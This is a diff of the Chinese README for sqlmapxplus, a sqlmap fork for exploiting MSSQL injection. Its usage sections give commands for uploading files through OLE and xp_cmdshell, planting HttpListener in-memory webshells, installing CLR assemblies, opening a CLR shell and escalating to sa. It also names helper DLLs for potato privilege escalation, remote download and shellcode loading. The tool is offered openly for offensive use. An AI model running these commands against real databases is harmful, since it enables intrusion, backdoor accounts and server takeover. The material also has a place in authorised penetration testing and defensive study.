@@ -6,28 +6,21 @@
 
 sqlmapxplus 基于sqlmap，对经典的数据库漏洞利用工具进行二开，参考各种解决方法，增加MSSQL数据库注入的利用方式。目前已完成部分二开，包括ole、xpcmdshell两种文件上传、内存马上传、clr安装功能，能够实现mssql注入场景下的自动化注入内存马、自动化提权、自动化添加后门用户、自动化远程文件下载、自动化shellcode加载功能。
 
-1. **20240508更新说明**：
-   新增开启ole功能、
-   新增指定文件读取功能、
-   新增指定文件移动功能、
-   新增指定文件复制功能、
-   新增指定文件删除功能、
-   新增指定文件位置判断功能、
-   新增存储过程查询功能、
-   新增删除存储过程功能、
-   修改ole上传方式、
-   修改clr安装流程、
-   修改clr命令执行方式、
-   去除中文注释导致的报错
-3. 针对实际网络过程中dll传输损失导致clr安装失败的问题（临时解决方法）
-   发现在原--install-clr功能中使用的clr dll太大，在实战中往往需要注入的大量次数，如果注入过程中的某一次出现错误，会导致dll落地失败，无法成功打入dll，现将原本一键自动安装的流程去除，修改为用户需要根据实际的目标情况，自定义的dll安装、
+1. **20250121更新说明**：
+   更新工具的交互方式、
+   更新CLR注入利用方式
+   
+3. 针对实际网络过程中dll传输损失导致clr安装失败的问题
+   更新CLR落地加载功能（需要落地dll）和一键数据库CLR加载功能（无需落地dll）根据场景选择合适的注入方法、
    临时增加 --check-file 选项判断dll文件是否成功落地目标主机、
-   临时增加--check-clr 判断用户自定义函数是否在数据库中加载成功
+   临时增加--check-clr 判断用户自定义函数是否在数据库中加载成功、
+   需要注意的是 --check-file 和 --check-clr 选项存在判断不准确的问题，仅供参考
+   实践过程中可能受url编码等影响，会到账注入利用失败
 
-4. 为什么使用上传过程中会出现dll放大的问题
-   转换为十六进制落地再还原导致的文件增大，如字母 A 经过十六进制 会转换 为 41，增大一倍
+5. 为什么使用上传过程中会出现dll放大的问题
+   转换为十六进制落地再还原导致的文件增大，如字母 A 经过十六进制 会转换 为 41，增大一倍，ole文件上传极限为20kb
 
-5. 自定义clr的问题（已完成）
+6. 自定义clr的问题（已完成）
    install-clr修改为，需要指定自定义的clr.dll路径，在提示框输入 用户自定义类名 用户自定义方法名
    clr_shell模式下执行clr函数的方式修改为： 用户自定义function 传入参数（已完成）
 
@@ -49,8 +42,10 @@ Operating system access:
 --enable-ole        enable ole 
 --check-clr   check user-defined functions in the database
 --del-clr   delete user-defined functions in the database
---install-clr       install clr
+--install-clr1      install clr1
+--install-clr2      install clr2
 --clr-shell         clr shell 
+--to-sa             current db to sa
 --sharpshell-upload1  sharpshell upload1
 --sharpshell-upload2  sharpshell upload2 
 ```
@@ -59,7 +54,7 @@ Operating system access:
 
 ### Usage
 
-**about ole**:
+**文件操作功能**:
 
 ```
 # 开启 ole 利用功能
@@ -80,32 +75,22 @@ python sqlmap.py -r/-u xxx --ole-move remote_file_path1 --file-dest remote_file_
 # 通过 ole 复制文件
 python sqlmap.py -r/-u xxx --ole-copy remote_file_path1 --file-dest remote_file_path2
 
-# 通过 ole 实现的HttpListener内存马上传方式
-# 默认上传至c:\Windows\tasks\listen.tmp.txt，需要以system权限运行
-python sqlmap.py -r/-u xxx --sharpshell-upload2 
-```
-
-**other function:**
-
-```
 # 通过 xp_cmdshell 上传文件
 python sqlmap.py -r/-u xxx --xp-upload local_file_path --file-dest remote_file_path
 
 # 使用 xp_fileexis 来检查文件是否存在
 python sqlmap.py -r/-u xxx --check-file remote_file_path
 
-# 查询数据库中是否存在用户自定义函数
-python sqlmap.py -r/-u xxx --check-clr clr_function_name
-
-# 删除用户自定义函数
-python sqlmap.py -r/-u xxx --del-clr clr_function_name
+# 通过 ole 实现的HttpListener内存马上传方式
+# 默认上传至c:\Windows\tasks\listen.tmp.txt，需要以system权限运行
+python sqlmap.py -r/-u xxx --sharpshell-upload2 
 
 # 通过 xp_cmdshell实现的HttpListener内存马上传方式
 # 默认上传至c:\Windows\tasks\listen.tmp.txt，需要以system权限运行
 python sqlmap.py -r/-u xxx --sharpshell-upload1 
 ```
 
-**about clr**:
+**CLR相关的功能**
 
 ```
 # 开启 clr 利用功能
@@ -114,11 +99,17 @@ python sqlmap.py -r/-u xxx --enable-clr
 # 关闭 clr 利用功能
 python sqlmap.py -r/-u xxx --disable-clr
 
+# 查询数据库中是否存在用户自定义函数
+python sqlmap.py -r/-u xxx --check-clr
+
 # 进入 clr 安装模式
 python sqlmap.py -r/-u xxx --install-clr
 
 # 进入 clr-shell 命令交互模式
 python sqlmap.py -r/-u xxx --clr-shell 
+
+# 删除用户自定义函数
+python sqlmap.py -r/-u xxx --del-clr
 
 # clr dll 参考如下，更多其他dll请参考星球获取
 # 存储过程类名Xplus，存储过程函数名需要注意大小写，分别为
@@ -129,6 +120,7 @@ clrefspotato.dll
 clrdownload.dll
 clrshellcodeloader.dl
 ```
+
 
 ### 其他
 
